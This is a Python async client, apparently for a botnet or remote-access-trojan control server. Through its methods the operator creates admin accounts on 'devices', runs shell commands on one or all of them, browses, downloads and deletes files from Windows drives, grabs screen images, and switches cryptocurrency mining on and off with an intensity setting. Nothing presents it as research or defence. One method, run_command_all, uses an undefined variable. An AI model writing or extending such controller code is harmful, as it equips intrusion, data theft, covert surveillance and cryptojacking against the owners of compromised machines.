import json
import aiohttp
from typing import Optional, Dict, Any
from utils.config import get_pi_url, load_config


class PiClient:
    def __init__(self):
        self.config = load_config()
        self.base_url = get_pi_url(self.config)
        self.session: Optional[aiohttp.ClientSession] = None

    async def _get_session(self):
        if self.session is None or self.session.closed:
            self.session = aiohttp.ClientSession()
        return self.session

    async def close(self):
        if self.session and not self.session.closed:
            await self.session.close()

    async def get_devices(self) -> Dict[str, Any]:
        try:
            session = await self._get_session()
            async with session.get(f"{self.base_url}/api/devices") as resp:
                return await resp.json()
        except Exception as e:
            return {"error": str(e), "devices": []}

    async def get_device(self, device_id: str) -> Dict[str, Any]:
        try:
            session = await self._get_session()
            async with session.get(f"{self.base_url}/api/devices/{device_id}") as resp:
                return await resp.json()
        except Exception as e:
            return {"error": str(e)}

    async def create_admin(self, device_id: str, username: str, password: str) -> Dict[str, Any]:
        try:
            session = await self._get_session()
            async with session.post(
                f"{self.base_url}/api/devices/{device_id}/admin/create",
                json={"device_id": device_id, "username": username, "password": password}
            ) as resp:
                return await resp.json()
        except Exception as e:
            return {"error": str(e)}

    async def run_command(self, device_id: str, command: str) -> Dict[str, Any]:
        try:
            session = await self._get_session()
            async with session.post(
                f"{self.base_url}/api/devices/{device_id}/command",
                json={"device_id": device_id, "command": command}
            ) as resp:
                return await resp.json()
        except Exception as e:
            return {"error": str(e)}

    async def run_command_all(self, command: str) -> Dict[str, Any]:
        try:
            session = await self._get_session()
            async with session.post(
                f"{self.base_url}/api/devices/{device_id}/command/all",
                json={"command": command}
            ) as resp:
                return await resp.json()
        except Exception as e:
            return {"error": str(e)}

    async def browse_files(self, device_id: str, path: str = "C:\\") -> Dict[str, Any]:
        try:
            session = await self._get_session()
            async with session.get(
                f"{self.base_url}/api/devices/{device_id}/files",
                params={"path": path}
            ) as resp:
                return await resp.json()
        except Exception as e:
            return {"error": str(e), "files": []}

    async def download_file(self, device_id: str, remote_path: str) -> Optional[bytes]:
        try:
            session = await self._get_session()
            async with session.get(
                f"{self.base_url}/api/devices/{device_id}/files/download",
                params={"remote_path": remote_path}
            ) as resp:
                if resp.status == 200:
                    return await resp.read()
        except Exception:
            pass
        return None

    async def delete_file(self, device_id: str, remote_path: str) -> Dict[str, Any]:
        try:
            session = await self._get_session()
            async with session.delete(
                f"{self.base_url}/api/devices/{device_id}/files",
                params={"remote_path": remote_path}
            ) as resp:
                return await resp.json()
        except Exception as e:
            return {"error": str(e)}

    async def configure_mining(self, device_id: str, enabled: bool, intensity: int = 50) -> Dict[str, Any]:
        try:
            session = await self._get_session()
            async with session.post(
                f"{self.base_url}/api/devices/{device_id}/mining",
                json={"device_id": device_id, "enabled": enabled, "intensity": intensity}
            ) as resp:
                return await resp.json()
        except Exception as e:
            return {"error": str(e)}

    async def get_mining_stats(self, device_id: str) -> Dict[str, Any]:
        try:
            session = await self._get_session()
            async with session.get(
                f"{self.base_url}/api/devices/{device_id}/mining/stats"
            ) as resp:
                return await resp.json()
        except Exception as e:
            return {"error": str(e)}

    async def get_screen_image(self, device_id: str) -> Optional[bytes]:
        try:
            session = await self._get_session()
            async with session.get(
                f"{self.base_url}/api/screen/{device_id}"
            ) as resp:
                if resp.status == 200:
                    return await resp.read()
        except Exception:
            pass
        return None


pi_client = PiClient()
